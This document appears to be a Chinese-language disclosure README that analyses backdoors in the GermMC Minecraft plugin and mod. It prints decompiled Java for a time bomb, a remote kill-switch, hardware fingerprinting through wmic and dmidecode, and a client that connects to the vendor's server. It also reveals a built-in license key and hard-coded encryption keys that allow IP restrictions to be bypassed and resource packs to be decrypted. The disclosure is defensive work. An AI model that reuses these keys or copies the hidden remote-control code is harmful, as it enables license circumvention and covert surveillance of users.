# 萌芽后门总结
对萌芽引擎中存在的所有后门和可能的泄露隐私点进行总结，其中包括混淆器自动插入的和如何处理这些后门。

如果你需要审计使用的反混淆过的jar，请在issue下留下自己的邮箱吗，我会将反混淆过的jar发送到你的邮箱下。
# 文中后门定义
后门是软件开发过程中引入的。在软件的开发阶段，程序员常会在软件内创建后门以方便测试或者修改程序中的缺陷，但在软件发布时，后门被有意或者无意忽视了，没有被删除，那么这个软件天生就存在后门，安装该软件的主机就不可避免的引入了后门。

以我来看，你习以为常的操作不等于说它不是后门，这些都是影响服务器稳定的危险因素。

举个例子，如果我想用老版本萌芽，但是因为写了时间限制代码，导致老版本无法使用，而新版本又因为bug等原因无法使用，这影响了服务器系统的稳定性和长期可靠性。

再举个例子，如文中插件后门#2，一旦开发者触发，会导致所有分发的萌芽插件副本无法使用，会造成所有萌芽服务器被迫终止业务，这无疑也是对现有服务器稳定性的巨大危害。

再举个例子，如文中mod后门#1，如果开发者因为受贿等原因，需要使得指定服务器业务终止，他就可以通过远程发送崩端包到目标客户群体的客户端，使得该服务器玩家全部崩端，这更不用说危害有多大。
# 插件部分
插件部分后门并不多且危害不大

1.时间判断后门，混淆器自动插入
````java
if (new Date().after(new Date(1881676800964L))) {
    throw new Throwable(VerifyManager.ALLATORIxDEMO("仳砭迗朳亖"));
}
````
处理方法:存在于大多数类的构造函数中，可通过检测特征Date构建和异常抛出包围去除相关字节码


2.插件停用后门
````java
    @Override
    public void run() {
        String[] stringArray = new String[]{"https://germmc.gitee.io/minecraft/verification/GermGerm99", "http://germmc.gitee.io/minecraft/verification/GermGerm99", "http://github.germmc.com/verification/GermGerm99", "https://github.germmc.com/verification/GermGerm99", "http://verify.germmc.com/version/engine", "https://verify.germmc.com/version/engine"};
        int n = 0;
        int n2 = 0;
        em1 em12 = new em1();
        String[] stringArray2 = stringArray;
        int n3 = stringArray2.length;
        int n4 = 0;
        while (qi.Method421(n4, n3)) {
            String string = stringArray2[n4];
            if (qi.Method420(n)) break;
            try {
                String string2 = em12.Method1748(string).replaceAll("\r\n", "");
                n2 = "1.0".equals(String.valueOf(Double.parseDouble(string2))) ? 1 : 0;
                n = 1;
            } catch (Exception exception) {
                // empty catch block
            }
            ++n4;
        }
        if (qi.Method420(n) && qi.Method422(n2)) {
            gn.Method596().Method458();
            gn.Method596().Method600(new qi1(this));
        }
    }
````
其中qi1的代码为
````java
    @Override
    public boolean Method228(CommandSender commandSender, String string, List<String> list) {
        LogUtil.sendMessage(commandSender, "&cGermPlugin 发现重大BUG，该版本被强制弃用了，需要更新新版!", new Object[0]);
        LogUtil.sendMessage(commandSender, "&cGermPlugin 发现重大BUG，该版本被强制弃用了，需要更新新版!", new Object[0]);
        LogUtil.sendMessage(commandSender, "&cGermPlugin 发现重大BUG，该版本被强制弃用了，需要更新新版!", new Object[0]);
        return true;
    }
````
处理方法：修改host屏蔽掉如下网址，或通过字节码替换掉所有出现的网址
``"https://germmc.gitee.io/minecraft/verification/GermGerm99", "http://germmc.gitee.io/minecraft/verification/GermGerm99", "http://github.germmc.com/verification/GermGerm99", "https://github.germmc.com/verification/GermGerm99", "http://verify.germmc.com/version/engine", "https://verify.germmc.com/version/engine"``

3.机器码获取
````java
public class re {
    private static String Field1110 = null;
    private static String Field1111 = null;

    private static boolean Method1488(int n) {
        return n == 0;
    }

    private static boolean Method1489(Object object) {
        return object == null;
    }

    public static char[] Method1490() throws Exception {
        char[] cArray = re.Method1502().toString().toCharArray();
        char[] cArray2 = re.Method1493().toCharArray();
        char[] cArray3 = re.Method1491().toCharArray();
        char[] cArray4 = re.Method1503(cArray, cArray2, cArray3);
        int n = 0;
        while (re.Method1499(n, cArray4.length)) {
            int n2 = n;
            char c = Character.toUpperCase(cArray4[n]);
            ++n;
            cArray4[n2] = c;
        }
        return cArray4;
    }

    public static String Method1491() throws Exception {
        String string;
        String string2 = System.getProperty("os.name");
        if (re.Method1501(string2.contains("Windows") ? 1 : 0)) {
            return re.Method1504("wmic path win32_physicalmedia get serialnumber");
        }
        if (re.Method1501(string2.contains("Linux") ? 1 : 0)) {
            String string3 = re.Method1498("dmidecode |grep -A16 \"System Information$\"", "Serial Number");
            if (re.Method1496(string3)) {
                return string3.substring(string3.indexOf(":")).trim();
            }
        } else if (re.Method1501(string2.contains("Mac") ? 1 : 0) && re.Method1496(string = re.Method1498("system_profiler SPStorageDataType", "Volume UUID"))) {
            return string.substring(string.indexOf(":") + 1).trim();
        }
        return "";
    }

    private static boolean Method1492(int n, int n2) {
        return n == n2;
    }

    public static String Method1493() throws Exception {
        String string;
        String string2 = System.getProperty("os.name");
        if (re.Method1501(string2.contains("Windows") ? 1 : 0)) {
            return re.Method1504("wmic cpu get ProcessorId");
        }
        if (re.Method1501(string2.contains("Linux") ? 1 : 0)) {
            String string3 = re.Method1498("dmidecode |grep -A16 \"Processor Information$\"", "ID");
            if (re.Method1496(string3)) {
                return string3.substring(string3.indexOf(":")).trim();
            }
        } else if (re.Method1501(string2.contains("Mac") ? 1 : 0) && re.Method1496(string = re.Method1498("system_profiler SPHardwareDataType", "Serial Number"))) {
            return string.substring(string.indexOf(":") + 1).trim();
        }
        return "";
    }

    public static synchronized String Method1494() {
        if (re.Method1496(Field1111)) {
            return Field1111;
        }
        try {
            URL uRL = new URL("https://httpbin.org/ip");
            HttpURLConnection httpURLConnection = (HttpURLConnection)uRL.openConnection();
            httpURLConnection.setRequestMethod("GET");
            int n = httpURLConnection.getResponseCode();
            if (re.Method1492(n, 200)) {
                String string;
                BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(httpURLConnection.getInputStream()));
                StringBuilder stringBuilder = new StringBuilder();
                while (re.Method1496(string = bufferedReader.readLine())) {
                    stringBuilder.append(string);
                }
                bufferedReader.close();
                Field1111 = String.valueOf(stringBuilder).split("\"")[3];
                return Field1111;
            }
            System.out.println(String.valueOf(new StringBuilder().insert(0, "无法获取公共IP地址。HTTP响应代码：").append(n)));
            return UUID.randomUUID().toString();
        } catch (Exception exception) {
            // empty catch block
        }
        return UUID.randomUUID().toString();
    }

    public static void Method1495(String string) {
        try {
            re.Method1500(new URI(string));
            return;
        } catch (URISyntaxException uRISyntaxException) {
            uRISyntaxException.printStackTrace();
            return;
        }
    }

    private static boolean Method1496(Object object) {
        return object != null;
    }

    public static String Method1497() throws Exception {
        if (re.Method1489(Field1110)) {
            Field1110 = Base64.getEncoder().encodeToString(new String(re.Method1490()).replace("\r\n", "").getBytes(StandardCharsets.UTF_8));
        }
        return Field1110;
    }

    public static String Method1498(String string, String string2) throws Exception {
        Scanner scanner = null;
        try {
            String string3;
            Process process = Runtime.getRuntime().exec(string);
            process.getOutputStream().close();
            scanner = new Scanner(process.getInputStream());
            while (re.Method1501(scanner.hasNextLine() ? 1 : 0)) {
                string3 = scanner.nextLine();
                if (!re.Method1496(string3) || !re.Method1501(string3.contains(string2) ? 1 : 0)) continue;
                String string4 = string3.trim();
                return string4;
            }
            scanner.close();
            string3 = null;
            return string3;
        } finally {
            if (re.Method1496(Collections.singletonList(scanner).get(0))) {
                scanner.close();
            }
        }
    }

    private static boolean Method1499(int n, int n2) {
        return n < n2;
    }

    public static void Method1500(URI uRI) {
        try {
            if (re.Method1501(Desktop.isDesktopSupported() ? 1 : 0)) {
                Desktop.getDesktop().browse(uRI);
                return;
            }
        } catch (Exception exception) {
            exception.printStackTrace();
        }
    }

    private static boolean Method1501(int n) {
        return n != 0;
    }

    public static List<String> Method1502() throws Exception {
        ArrayList<String> arrayList = new ArrayList<String>();
        StringBuilder stringBuilder = new StringBuilder();
        Enumeration<NetworkInterface> enumeration = NetworkInterface.getNetworkInterfaces();
        while (re.Method1501(enumeration.hasMoreElements() ? 1 : 0)) {
            Iterator<InterfaceAddress> iterator = enumeration.nextElement().getInterfaceAddresses().iterator();
            while (re.Method1501(iterator.hasNext() ? 1 : 0)) {
                byte[] byArray;
                NetworkInterface networkInterface;
                InetAddress inetAddress = iterator.next().getAddress();
                if (re.Method1501(inetAddress.isLinkLocalAddress() ? 1 : 0) || re.Method1489(networkInterface = NetworkInterface.getByInetAddress(inetAddress)) || re.Method1489(byArray = networkInterface.getHardwareAddress())) continue;
                stringBuilder.delete(0, stringBuilder.length());
                int n = 0;
                while (re.Method1499(n, byArray.length)) {
                    Object[] objectArray = new Object[]{byArray[n], re.Method1499(n, byArray.length - 1) ? "-" : ""};
                    ++n;
                    stringBuilder.append(String.format("%02X%s", objectArray));
                }
                if (!re.Method1488(arrayList.contains(String.valueOf(stringBuilder)) ? 1 : 0)) continue;
                arrayList.add(String.valueOf(stringBuilder));
            }
        }
        return arrayList;
    }

    public static char[] Method1503(char[] ... cArray) {
        int n = 0;
        Object object = cArray;
        int n2 = ((char[][])object).length;
        int n3 = 0;
        while (re.Method1499(n3, n2)) {
            char[] cArray2 = object[n3];
            ++n3;
            n += cArray2.length;
        }
        object = new char[n];
        n2 = 0;
        char[][] cArray3 = cArray;
        int n4 = cArray3.length;
        int n5 = 0;
        while (re.Method1499(n5, n4)) {
            char[] cArray4 = cArray3[n5];
            System.arraycopy(cArray4, 0, object, n2, cArray4.length);
            ++n5;
            n2 += cArray4.length;
        }
        return object;
    }

    public static String Method1504(String string) throws Exception {
        Scanner scanner = null;
        try {
            String string2;
            StringBuilder stringBuilder = new StringBuilder();
            Process process = Runtime.getRuntime().exec(string);
            process.getOutputStream().close();
            scanner = new Scanner(process.getInputStream());
            while (re.Method1501(scanner.hasNextLine() ? 1 : 0)) {
                string2 = scanner.nextLine();
                stringBuilder.append(string2.replaceAll(" ", ""));
            }
            scanner.close();
            string2 = String.valueOf(stringBuilder);
            return string2;
        } finally {
            if (re.Method1496(Collections.singletonList(scanner).get(0))) {
                scanner.close();
            }
        }
    }

    public static String Method1505() {
        try {
            return re.Method1497();
        } catch (Exception exception) {
            return re.Method1494();
        }
    }
}

````
处理方法：通过字节码替换工具，检测含wmic的字符串，定义到此类，令返回字符串的方法返回空，也可以不使用官方认证

逻辑分析：获取磁盘id、cpuid、mac地址拼接返回，出现异常就返回ip

4.内置测试cdk
````java
    @Override
    public void Method1634(ChannelHandlerContext channelHandlerContext) throws Exception {
        SecretKey secretKey = pb.Method1990();
        qa qa2 = new qa(secretKey, this.Field1211, this.Field1210);
        channelHandlerContext.writeAndFlush(qa2);
        ChannelPipeline channelPipeline = channelHandlerContext.pipeline();
        channelPipeline.addFirst("decrypt", new ib(secretKey));
        channelPipeline.addFirst("encrypt", new zb(secretKey));
        sl1.Field225 = true;
        sl1.Method315();
        String string = re.Method1505();
        if (va.Method1635(db.Field1445 ? 1 : 0)) {
            String string2 = "6JCM6IQ9E9D4B58AF2CA416BB7924C05F79C778C";
            String string3 = "GermPlugin";
            bb.Method2013(new xa(string3, string2, string));
            return;
        }
        String string4 = hm.Method537().getString("VerifyCDK");
        String string5 = GermPlugin.getPlugin().getName();
        bb.Method2013(new xa(string5, string4, string));
    }
````
说明:内置了一个测试用的cdK,可以通过channelpipeline定位到验证代码，这个cdk是标准版的

## mod部分

1.长链接客户端远程操控后门

相关代码
````java

    private final int Field6525 = 29975;
    public static final boolean Field6526 = false;
    private final String Field6527;
    private final String Field6528;
    
    @HideAccess
    public void Method9771() throws Exception {
        NioEventLoopGroup nioEventLoopGroup = new NioEventLoopGroup(1);
        try {
            Bootstrap bootstrap = new Bootstrap();
            nu.Method9773("-u3bj8f", (Bootstrap)nu.Method9773("-1ou7j8g", (Bootstrap)nu.Method9773("-18b7j8j", (Bootstrap)nu.Method9773("-1eqdj8k", bootstrap, nioEventLoopGroup), NioSocketChannel.class), (ChannelOption)r.Method7853(-908119310), (Object)30000), (Object)new nu1(this));
            Channel channel = nu.Method9773("6lucp6", bootstrap, new InetSocketAddress("verify.germmc.com", 29975)).sync().channel();
            ar.Method9392(channel);
            ArrayList<String> arrayList = new ArrayList<String>();
            arrayList.addAll(cba.Method10544());
            arrayList.addAll(ada.Method10520().Method10522());
            ar.Method9393(new gz("4.4.0", arrayList, iq.Method10616(), mq1.Method7227()));
            mw.Method6460();
            channel.closeFuture().sync();
            return;
        } finally {
            nioEventLoopGroup.shutdownGracefully();
        }
    }

    public static void Method9772() throws InterruptedException {
        CompletableFuture.runAsync(() -> {
            this.Field6528 = "verify.germmc.com";
            this.Field6527 = "127.0.0.1";
            this.Field6528 = "verify.germmc.com";
            this.Field6527 = "127.0.0.1";
            try {
                this.Method9771();
            } catch (Exception exception) {
                // empty catch block
            }
        });
        Class<edb> clazz = edb.class;
        synchronized (clazz) {
            edb.class.wait(13333L);
            return;
        }
    }
````

这段代码展示了，萌芽模组如何链接到后门服务器，以及进行相关内容发送，详细信息见 https://github.com/PillowFrame/VirtualGermModBackDoorServer

危害：远程非法收集用户主机上包括QQ号等隐私信息到萌芽作者自己的服务器，远程指定特定客户端崩端

2.内置不受IP认证限制的服务器

相关代码
````java
@HideAccess
    public hw() {
        this.Field4801 = "GermMod.so";
        this.Field4797 = "GermMod32.dll";
        this.Field4797 = "GermMod32.dll";
        this.Field4801 = "GermMod.so";
        ((List)r.Method7851(this, -678350049)).add("play.germmc.com");
        ((List)r.Method7851(this, -678350049)).add("remote2.germmc.com");
        ((List)r.Method7851(this, -678350049)).add("pan.germmc.com");
        ((List)r.Method7851(this, -678350049)).add("forum.germmc.com");
        ((List)r.Method7851(this, -678350049)).add("play.fkdg.net");
        ((List)r.Method7851(this, -678350049)).add("play.rpgcraft.cn");
        ((List)r.Method7851(this, -678350049)).add("lt.rpgcraft.cn");
        ((List)r.Method7851(this, -678350049)).add("dx.rpgcraft.cn");
        ((List)r.Method7851(this, -678350049)).add("yd.rpgcraft.cn");
        ((List)r.Method7851(this, -678350049)).add("s1.germmc.com");
        ((List)r.Method7851(this, -678350049)).add("s2.germmc.com");
        ((List)r.Method7851(this, -678350049)).add("s3.germmc.com");
        ((List)r.Method7851(this, -678350049)).add("s4.germmc.com");
        ((List)r.Method7851(this, -678350049)).add("s5.germmc.com");
        ((List)r.Method7851(this, -678350049)).add("s6.germmc.com");
        ((List)r.Method7851(this, -678350049)).add("s7.germmc.com");
        try {
            Object object;
            Object object2;
            File file = (File)r.Method7853(109261602);
            pj pj2 = new pj(file);
            om om2 = pj2.Method1519(pj2.Method1478("GermMod32.dll"));
            byte[] byArray = IOUtils.readFully((InputStream)om2, (int)1024);
            if (byArray[0] != 71) {
                return;
            }
            Object object3 = new ArrayList<Byte>();
            for (int i = 1; i < 1024 && (byArray[i] != 59 || byArray[i + 1] != 0); ++i) {
                if (byArray[i] == 59 && byArray[i + 1] == 10) {
                    object2 = new byte[((ArrayList)object3).size()];
                    IntStream.range(0, ((ArrayList)object3).size()).forEach(arg_0 -> hw.Method7863((byte[])object2, (ArrayList)object3, arg_0));
                    object = (byte[])hw.Method7865("1618col", "?:P)(OL><KI*&UJM785^%TGB416$#EDCXSW@!QAZ", (byte[])object2);
                    String string = new String((byte[])object, (Charset)r.Method7853(1962816282)).toLowerCase((Locale)r.Method7853(-1221119205));
                    ((List)r.Method7851(this, -678350049)).add(string);
                    if (string.startsWith("ws://")) {
                        ((List)r.Method7851(this, -678350049)).add(string.replace("ws://", ""));
                    }
                    ++i;
                    ((ArrayList)object3).clear();
                    continue;
                }
                ((ArrayList)object3).add(byArray[i]);
            }
            om2 = pj2.Method1519(pj2.Method1478("GermMod.so"));
            byArray = IOUtils.readFully((InputStream)om2, (int)2048);
            if (byArray[0] != 71) {
                return;
            }
            object3 = new String(byArray, (Charset)r.Method7853(1962816282));
            String[] stringArray = ((String)object3).substring(1).split("@@@");
            object2 = stringArray[0];
            object = stringArray[1];
            this.Field4803 = new String((byte[])hw.Method7865("-14nj6f", ((String)object2).getBytes((Charset)r.Method7853(1962816282))), (Charset)r.Method7853(1962816282));
            this.Field4796 = new String((byte[])hw.Method7865("-14nj6f", ((String)object).getBytes((Charset)r.Method7853(1962816282))), (Charset)r.Method7853(1962816282));
        } catch (Throwable throwable) {
        } finally {
            hw.Method7865("-ntdj7a", (String)r.Method7851(this, -827444418));
        }
    }
````

从中我们不难看出，不受IP限制的服务器有
- play.germmc.com
- remote2.germmc.com
- pan.germmc.com
- forum.germmc.com
- play.fkdg.net
- play.rpgcraft.cn
- lt.rpgcraft.cn
- dx.rpgcraft.cn
- yd.rpgcraft.cn
- s1.germmc.com
- s2.germmc.com
- s3.germmc.com
- s4.germmc.com
- s5.germmc.com
- s6.germmc.com
- s7.germmc.com

以及泄露的关键信息为，其加密密钥为``?:P)(OL><KI*&UJM785^%TGB416$#EDCXSW@!QAZ``(萌芽Cache也使用该密钥进行加解密)，想要修改IP限制，参考项目 https://github.com/PillowFrame/GermModHideInfoExtracter

3.材质包加密原理

这并不是后门，但是我懒得开一个新的项目专门写萌芽原理解析专题了，我不觉得萌芽的材质包加密哪里神秘，就是一个ZIP加密通过服务器下发密钥，并且网络传输过程中通过指定密钥进行加密。

我倒是想问问萌芽作者，你就这点水平，你又没有自己的压缩方法和技术，也没有自己的加密方法，你有什么可牛的？这点三脚猫功夫也让你吹上天了。

````java
    public static void Method303(Player player) {
        block3: {
            block2: {
                if (!sl1.Method341(hm.Method537().isList("ResourcePacks") ? 1 : 0)) break block2;
                Iterator iterator = hm.Method537().getStringList("ResourcePacks").iterator();
                while (sl1.Method341(iterator.hasNext() ? 1 : 0)) {
                    String string = (String)iterator.next();
                    String[] stringArray = string.split("<->", 2);
                    GermPacketAPI.send(player, new lc(stringArray[0], gj.Method431(stringArray[1].getBytes(Charset.defaultCharset()))));
                }
                break block3;
            }
            if (!sl1.Method341(hm.Method537().isConfigurationSection("ResourcePacks") ? 1 : 0)) break block3;
            Iterator iterator = hm.Method537().getConfigurationSection("ResourcePacks").getKeys(false).iterator();
            while (sl1.Method341(iterator.hasNext() ? 1 : 0)) {
                String string = (String)iterator.next();
                String string2 = hm.Method537().getString(new StringBuilder().insert(0, "ResourcePacks.").append(string).toString());
                GermPacketAPI.send(player, new lc(string, gj.Method431(string2.getBytes(Charset.defaultCharset()))));
            }
        }
    }
    private static byte[] Method428(byte[] byArray) {
        byte[] byArray2 = null;
        try {
            Key key = gj.Method432("!QAZ@WSX#EDCARFKAREWRTG8734TGYQR");
            Cipher cipher = Cipher.getInstance("DES");
            cipher.init(1, key);
            byArray2 = cipher.doFinal(byArray);
            return byArray2;
        } catch (Exception exception) {
            exception.printStackTrace();
            return byArray2;
        } finally {
            Object var2_5 = null;
        }
    }

    public static String Method431(byte[] byArray) {
        return Base64.encodeBase64String(gj.Method428(byArray));
    }
````

从代码中不难一眼看出，其加密密钥为``!QAZ@WSX#EDCARFKAREWRTG8734TGYQR``，且加密方法为公开的加密方法``DES``，发送材质包密码也无非是通过该DES密钥加密后发放给客户端，客户端使用相同的DES密钥解密后拿去当作zip密码进行解压。

如何从客户端提取和相关方法我就不写示例代码了，太简单了，插件反混淆搜索``ResourcePacks``关键字一下就定位到这个代码了，抓包拿到直接用密钥解就可以，完全没难度。具体如何定位到哪个包才是，自己原理分析吧，我不想提供具体的方法。